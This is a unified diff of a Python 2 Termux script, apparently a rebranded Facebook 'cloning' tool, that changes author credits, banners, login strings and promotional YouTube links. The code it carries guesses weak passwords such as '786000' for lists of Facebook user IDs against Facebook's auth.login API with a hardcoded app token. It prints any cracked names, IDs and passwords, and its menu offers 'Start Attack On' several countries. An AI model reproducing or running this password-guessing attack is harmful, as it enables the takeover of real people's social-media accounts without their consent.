@@ -1,6 +1,6 @@
 ﻿#!/usr/bin/python2
 #coding=utf-8
-#The Credit For This Code Goes To Rana Aahil
+#The Credit For This Code Goes To Arbab Memon
 #If You Wanna Take Credits For This Code, Please Look Yourself Again...
 #Reserved2020
 
@@ -48,32 +48,32 @@ def jalan(z):
 		sys.stdout.flush()
 		time.sleep(0.001)
 
-#Dev:Rana
+#Dev:Arbab-Memon
 ##### LOGO #####
 logo = """
 
-░█████╗░██╗░░░██╗██████╗░███████╗██████╗░
-██╔══██╗╚██╗░██╔╝██╔══██╗██╔════╝██╔══██╗
-██║░░╚═╝░╚████╔╝░██████╦╝█████╗░░██████╔╝
-██║░░██╗░░╚██╔╝░░██╔══██╗██╔══╝░░██╔══██╗
-╚█████╔╝░░░██║░░░██████╦╝███████╗██║░░██║
-░╚════╝░░░░╚═╝░░░╚═════╝░╚══════╝╚═╝░░╚═╝
+\033[1;95m░█████╗░██╗░░░██╗██████╗░███████╗██████╗░
+\033[1;95m██╔══██╗╚██╗░██╔╝██╔══██╗██╔════╝██╔══██╗
+\033[1;95m██║░░╚═╝░╚████╔╝░██████╦╝█████╗░░██████╔╝
+\033[1;95m██║░░██╗░░╚██╔╝░░██╔══██╗██╔══╝░░██╔══██╗
+\033[1;95m╚█████╔╝░░░██║░░░██████╦╝███████╗██║░░██║
+\033[1;95m░╚════╝░░░░╚═╝░░░╚═════╝░╚══════╝╚═╝░░╚═╝
 
 
-██╗░░██╗░█████╗░░█████╗░██╗░░██╗███████╗██████╗░
-██║░░██║██╔══██╗██╔══██╗██║░██╔╝██╔════╝██╔══██╗
-███████║███████║██║░░╚═╝█████═╝░█████╗░░██████╔╝
-██╔══██║██╔══██║██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
-██║░░██║██║░░██║╚█████╔╝██║░╚██╗███████╗██║░░██║
-╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
+\033[1;95m██╗░░██╗░█████╗░░█████╗░██╗░░██╗███████╗██████╗░
+\033[1;95m██║░░██║██╔══██╗██╔══██╗██║░██╔╝██╔════╝██╔══██╗
+\033[1;95m███████║███████║██║░░╚═╝█████═╝░█████╗░░██████╔╝
+\033[1;95m██╔══██║██╔══██║██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
+\033[1;95m██║░░██║██║░░██║╚█████╔╝██║░╚██╗███████╗██║░░█ 
+\033[1;95m╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
 
 \033[1;95m┈┈┈╱▔▔▔▔▔▔╲┈╭━━━━━╮┈┈ Markzukerburg Ka Baap.
-\033[1;95m┈┈▕┈╭━╮╭━╮┈▏┃ Arbab┃┈┈ Memon Arbab 
+\033[1;96m┈┈▕┈╭━╮╭━╮┈▏┃ Arbab┃┈┈ Memon Arbab 
 \033[1;97m┈┈▕┈┃╭╯╰╮┃┈▏╰┳━━━━╯┈┈ Facebook ki watt lagane Agaya
-\033[1;97m┈┈▕┈╰╯╭╮╰╯┈▏┈┃┈┈┈┈┈  Beta Memon Ko Feel Kar
-\033[1;97m┈┈▕┈┈┈┃┃┈┈┈▏━╯┈┈┈┈┈Dekh Beta Ghalat use nhi karne ka
-\033[1;95m┈┈▕┈┈┈╰╯┈┈┈▏┈┈┈┈┈┈┈Owner Arbab Ali Memon
-\033[1;95m┈┈▕╱╲╱╲╱╲╱╲▏┈┈┈┈┈┈┈Contact+923003023263
+\033[1;98m┈┈▕┈╰╯╭╮╰╯┈▏┈┃┈┈┈┈┈  Beta Memon Ko Feel Kar
+\033[1;99m┈┈▕┈┈┈┃┃┈┈┈▏━╯┈┈┈┈┈Dekh Beta Ghalat use nhi karne ka
+\033[1;94m┈┈▕┈┈┈╰╯┈┈┈▏┈┈┈┈┈┈┈Owner Arbab Ali Memon
+\033[1;93m┈┈▕╱╲╱╲╱╲╱╲▏┈┈┈┈┈┈┈Contact+923003023263
 
 \033[1;93m▇▇▇▇▇ Facebook\033[1;93m Aahil ▇▇▇▇▇
 \033[1;97m
@@ -92,7 +92,7 @@ logo = """
                   　| |　　) /
                    ノ )    Lﾉ
                   (_／     　　　
-\033[1;97m:•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•\033[1;93mBlackTiger\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•"""
+\033[1;97m:•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•\033[1;93mGangeLeader\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•"""
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -127,25 +127,25 @@ print  """
 ███████╗███████╗██║░░██║██████╔╝███████╗██║░░██║
 ╚══════╝╚══════╝╚═╝░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝
  
-\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;92mBlackTiger\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•"""
+\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;92mArbab-Memon\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•"""
 print  "\033[1;90m🔀 ⚌⚌⚌⚌⚌⚌⚍⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌ 🔀"
-jalan("\033[0;31m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶🌷") 
-jalan("\033[0;31m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶🌷") 
-jalan("\033[0;31m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶🌷") 
-jalan("\033[0;31m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶🌷") 
-jalan("\033[0;31m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶🌷 ") 
-jalan("\033[0;31m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶🌷") 
-jalan("\033[1;35m☠ Welcome to Aahil Creations ☠ ") 
-jalan("\033[0;37m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶🌷") 
-jalan("\033[0;37m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶🌷 ") 
-jalan("\033[0;37m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶🌷") 
-jalan("\033[0;37m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶🌷") 
-jalan("\033[0;37m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶🌷") 
-jalan("\033[0;37m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶🌷") 
+jalan("\033[0;31m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶Loading") 
+jalan("\033[0;32m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶Generating") 
+jalan("\033[0;33m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶Catching") 
+jalan("\033[0;34m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶Vpn Connecting") 
+jalan("\033[0;35m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶Token Access ") 
+jalan("\033[0;36m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶Internet Access√") 
+jalan("\033[1;37m☠ Shahzada Arbab Ali Memon  ☠ ") 
+jalan("\033[0;38m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶Use Only Data") 
+jalan("\033[0;39m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶Fatching Data ") 
+jalan("\033[0;91m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶Proceed") 
+jalan("\033[0;92m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶Data Active") 
+jalan("\033[0;93m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶Sytem Found") 
+jalan("\033[0;94m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶100%Done Proces") 
 print "\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;92mBlackTiger\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•"
 
-CorrectUsername = "rana"
-CorrectPassword = "rana"
+CorrectUsername = "Leader"
+CorrectPassword = "Arbab"
 
 loop = 'true'
 while (loop == 'true'):
@@ -158,10 +158,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;94mWrong Password"
-            os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+            os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+        os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA')
 
 def login():
 	os.system('clear')
@@ -171,12 +171,12 @@ def login():
 	except (KeyError,IOError):
 		os.system('clear')
 		print logo
-		jalan(' \033[1;93mWarning: \033[1;92mDo Not Use Your Personal Account' )
-		jalan(' \033[1;93mWarning: \033[1;92mUse a New Account To Login' )
-		jalan(' \033[1;93mWarning: \033[1;92mTermux All Version Working' )
-                jalan(' \033[1;91mWarning: \033[1;95mTermux Data Clear Everyday' ) 
-                jalan(' \033[1;91mWarning: \033[1;95mTool Update Everyday 👆' )                
-		print "\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•\033[1;92mBlackTiger\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•"
+		jalan(' \033[1;93mWarning: \033[1;92mMeri Jan Fake Account Login Kare' )
+		jalan(' \033[1;92mWarning: \033[1;92mApna real wala account mat thokna' )
+		jalan(' \033[1;91mWarning: \033[1;92mTermux ka koi bhi version ho chalega' )
+                jalan(' \033[1;39mWarning: \033[1;95mTool Daily Update hoti rahegi' ) 
+                jalan(' \033[1;38mWarning: \033[1;95mData Clear lazmi karna daily 👆' )                
+		print "\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•\033[1;92mBlackTiger\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•"
 		print('\033[1;97m═\x1b[1;91m.........LOGIN WITH FACEBOOK..........\x1b[1;97m═' )
 		print('	' )
 		id = raw_input('\033[1;97m[●] \x1b[1;96mFacebook/Email\x1b[1;97m: \x1b[1;92m')
@@ -208,14 +208,14 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;91mLogin Successful.•◄►•..'
-				os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+				os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
-				print"\n\x1b[1;97mThere is no internet connection"
+				print"\n\x1b[1;97mInternet To chek kar meri jan work nahi kar rahi"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\x1b[1;97mYour Account is on Checkpoint")
+			print("\n\x1b[1;97mMeri jaan ap ka account Cp pe he")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
@@ -243,28 +243,28 @@ def menu():
 		id = a['id']
 	except KeyError:
 		os.system('clear')
-		print"\033[1;97mYour Account is on Checkpoint"
+		print"\033[1;97mMeri Jaan Account Cp pe he "
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
 	except requests.exceptions.ConnectionError:
-		print"\x1b[1;94mThere is no internet connection"
+		print"\x1b[1;94mMeri jaan internet kahan he sudhar ja"
 		keluar()
-	os.system("clear") #Dev:Rana
+	os.system("clear") #Dev:Arbab-Memon
 	print logo
 	print "\033[1;97m«--•◄►••◄►•--\033[1;93mLogged in User Info\033[1;97m---•◄►••◄►•---»"
 	print "	   \033[1;93m ◄►••◄►Name\033[1;97m:\033[1;91m"+nama+"\033[1;93m               "
 	print "	   \033[1;93m ◄►••◄►ID\033[1;97m:\033[1;92m"+id+"\x1b[1;96m              "
 	print "\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•\033[1;91mBlackTiger\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•"
-	print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m1.\x1b[1;93m Start Cloning India"
-        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m2.\x1b[1;92m Start Cloning Pakistan ID&(Group)"
-        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m3.\x1b[1;96m Start Cloning Indonasia"
-        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m4.\x1b[1;95m Start Cloning USA"
-        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m5.\x1b[1;94m Start Cloning Bangladash"
-        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m6.\x1b[1;93m Start Cloning All Country"
-        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m7.\x1b[1;95m Start Cloning Member Group "
+	print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m1.\x1b[1;93m Start Attack On India"
+        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m2.\x1b[1;92m Start Attack On Pakistan ID&(Group)"
+        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m3.\x1b[1;96m Start Attack On Indonasia"
+        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m4.\x1b[1;95m Start Attack On USA(America)"
+        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m5.\x1b[1;94m Start Attack On Bangladash"
+        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m6.\x1b[1;93m Start Attack All Countris"
+        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m7.\x1b[1;95m Start Attack Member Group "
         print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m8.\x1b[1;92m Start Target  Attack"
-        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m9.\x1b[1;91m Black Tiger   Massage "
+        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m9.\x1b[1;91m Black Cyber Hacker   Massage "
         print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m10.\033[1;93mShow  Token"
         print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m11.\033[1;91mAfter Cloning Data Reset "
 	print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m0.\033[1;91m logout "
@@ -299,9 +299,9 @@ def pilih():
 		print logo
 		print " \033[1;91m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•Massage•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\n"
                 jalan('\033[1;92m............Massage..........')
-                jalan("\033[1;96mFrends Tool everyDay Update")
-                jalan('\033[1;96m11 Num Option Use every day ')
-                jalan('\033[1;96mChenal Off Due to Strik')
+                jalan("\033[1;96mData clear larna lazmi he daily")
+                jalan('\033[1;96mAger Ap ye commond use ksr rahe hai to ')
+                jalan('\033[1;96mYoutube Channel Cyber Gange Hidden Tricker')
                 jalan("\033[1;93m.........Command...........")
                 jalan('\033[1;96mapt update')
                 jalan('\033[1;96mapt upgrade')
@@ -310,11 +310,11 @@ def pilih():
                 jalan('\033[1;96mpkg install git')
                 jalan('\033[1;96mpip2 install requests')
                 jalan('\033[1;96mpip2 install mechanize') 
-                jalan("\033[1;96mgit clone https://github.com/TheAahil/pakistan407")
-                jalan('\033[1;96mcd pakistan407')
-                jalan('\033[1;96mpython2 Aahil')
-                jalan('\033[1;96mUser: rana')
-                jalan('\033[1;96mpass: rana')
+                jalan("\033[1;96mgit clone https://github.com/TheArbab/GangeLeader")
+                jalan('\033[1;96mcd GangeLeade')
+                jalan('\033[1;96mpython2 Arbab.py')
+                jalan('\033[1;96mUser: Leader')
+                jalan('\033[1;96mpass: Arbab')
                 jalan('\033[1;92m👆Copy Command & send 2 groups👆')
                 jalan('\033[1;91mYoutube Chenal Like Subscrib plzz')
 		os.system('git pull origin master')
@@ -417,7 +417,7 @@ def pilih_crack():
 		for p in s['data']:
 			id.append(p['id'])
         elif peak =="4":
-	        os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+	        os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA')
 	        menu()
 	elif peak =="0":
 		menu()
@@ -442,11 +442,11 @@ def pilih_crack():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:Rana
+			pass #Dev:Arbab Ali
 		try:													
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
 			b = json.loads(a.text)												
-			pass1 = b['first_name'] + '1234'												
+			pass1 = '786000'												
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			q = json.load(data)												
 			if 'access_token' in q:
@@ -474,7 +474,7 @@ def pilih_crack():
 			            if 'access_token' in q:	
 				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				            z = json.loads(x.text)
-				            print '\x1b[1;92m[  ✓  ] \x1b[1;92mHack100%💉'											
+				            print '\x1b[1;92m[  ✓  ] \x1b[1;38mHACK-ARBAB💉'											
 				            print '\x1b[1;92m[•⊱◄►⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
 				            print '\x1b[1;92m[•⊱◄►⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user								
 				            print '\x1b[1;92m[•⊱◄►⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass2 + '\n'											
@@ -496,7 +496,7 @@ def pilih_crack():
 					       if 'access_token' in q:	
 						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				                       z = json.loads(x.text)
-						       print '\x1b[1;92m[  ✓  ] \x1b[1;92mHack100%💉'								
+						       print '\x1b[1;92m[  ✓  ] \x1b[1;38mHACK-ARBAB💉'								
 						       print '\x1b[1;92m[•⊱◄►⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']									
 						       print '\x1b[1;92m[•⊱◄►⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user							
 						       print '\x1b[1;92m[•⊱◄►⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass3 + '\n'									
@@ -512,13 +512,13 @@ def pilih_crack():
 				                           cek.close()
 				                           cekpoint.append(user+pass3)									
 					               else:										
-						           pass4 = b['first_name'] + 'khan'											
+						           pass4 = '000786'											
 			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                   q = json.load(data)												
 			                                   if 'access_token' in q:		
 						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				                                   z = json.loads(x.text)
-				                                   print '\x1b[1;92m[  ✓  ] \x1b[1;92mHack100%💉'											
+				                                   print '\x1b[1;92m[  ✓  ] \x1b[1;38mHACK-ARBAB💉'											
 				                                   print '\x1b[1;92m[•⊱◄►⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
 				                                   print '\x1b[1;92m[•⊱◄►⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
 				                                   print '\x1b[1;92m[•⊱◄►⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass4 + '\n'											
@@ -540,7 +540,7 @@ def pilih_crack():
 						                       if 'access_token' in q:	
 						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				                                               z = json.loads(x.text)
-						                               print '\x1b[1;92m[  ✓  ] \x1b[1;92mHack100%💉'						
+						                               print '\x1b[1;92m[  ✓  ] \x1b[1;38mHACK-ARBAB💉'						
 						                               print '\x1b[1;92m[•⊱◄►⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']							
 						                               print '\x1b[1;92m[•⊱◄►⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user					
 						                               print '\x1b[1;92m[•⊱◄►⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass5 + '\n'							
@@ -562,7 +562,7 @@ def pilih_crack():
 			                                                           if 'access_token' in q:	
 								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				                                                           z = json.loads(x.text)
-				                                                           print '\x1b[1;92m[  ✓  ] \x1b[1;92mHack100%💉'											
+				                                                           print '\x1b[1;92m[  ✓  ] \x1b[1;38mHACK-ARBAB💉'											
 				                                                           print '\x1b[1;92m[•⊱◄►⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
 				                                                           print '\x1b[1;92m[•⊱◄►⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user									
 				                                                           print '\x1b[1;92m[•⊱◄►⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass6 + '\n'											
@@ -584,7 +584,7 @@ def pilih_crack():
 								                               if 'access_token' in q:		
 				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				                                                                       z = json.loads(x.text)
-									                               print '\x1b[1;92m[  ✓  ] \x1b[1;92mHack100%💉'					
+									                               print '\x1b[1;92m[  ✓  ] \x1b[1;92mHACK-ARBAB💉'					
 									                               print '\x1b[1;92m[•⊱◄►⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']					
 									                               print '\x1b[1;92m[•⊱◄►⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user				
 									                               print '\x1b[1;92m[•⊱◄►⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass7 + '\n'					
@@ -606,7 +606,7 @@ def pilih_crack():
 			                                                                                   if 'access_token' in q:		
 										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				                                                                                   z = json.loads(x.text)
-				                                                                                   print '\x1b[1;92m[  ✓  ] \x1b[1;92mHack100%💉'											
+				                                                                                   print '\x1b[1;92m[  ✓  ] \x1b[1;38mHACK-ARBAB💉'											
 				                                                                                   print '\x1b[1;92m[•⊱◄►⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
 				                                                                                   print '\x1b[1;92m[•⊱◄►⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user										
 				                                                                                   print '\x1b[1;92m[•⊱◄►⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass8 + '\n'											
@@ -628,7 +628,7 @@ def pilih_crack():
 										                                       if 'access_token' in q:		
 		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				                                                                                               z = json.loads(x.text)
-											                                       print '\x1b[1;92m[  ✓  ] \x1b[1;92mHack100%💉'			
+											                                       print '\x1b[1;92m[  ✓  ] \x1b[1;38mHACK-ARBAB💉'			
 											                                       print '\x1b[1;92m[•⊱◄►⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']			
 											                                       print '\x1b[1;92m[•⊱◄►⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user	
 											                                       print '\x1b[1;92m[•⊱◄►⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass9 + '\n'			
@@ -729,7 +729,7 @@ def pilih_hack():
 	        os.system('xdg-open https://mobile.facebook.com/groups/352588752366665')
 	        menu()
         elif peak =="3":
-	        os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+	        os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA')
 	        menu()
 	elif peak =="0":
 		menu()
@@ -1033,7 +1033,7 @@ def pilih_black():
 	        os.system('xdg-open https://mobile.facebook.com/groups/352588752366665')
 	        menu()
         elif peak =="3":
-	        os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+	        os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA')
 	        menu()
 	elif peak =="0":
 		menu()
@@ -1339,7 +1339,7 @@ def pilih_Tiger():
 	        os.system('xdg-open https://mobile.facebook.com/groups/352588752366665')
 	        menu()
         elif peak =="3":
-	        os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+	        os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA')
 	        menu()
 	elif peak =="0":
 		menu()
@@ -1646,7 +1646,7 @@ def pilih_test():
 	        os.system('xdg-open https://mobile.facebook.com/groups/352588752366665')
 	        menu()
         elif peak =="3":
-	        os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+	        os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA')
 	        menu()
 	elif peak =="0":
 		menu()
@@ -1945,7 +1945,7 @@ def pilih_super():
 	        os.system('xdg-open https://mobile.facebook.com/groups/352588752366665')
 	        menu()
         elif peak =="3":
-	        os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+	        os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA')
 	        menu()
 	elif peak =="0":
 		menu()
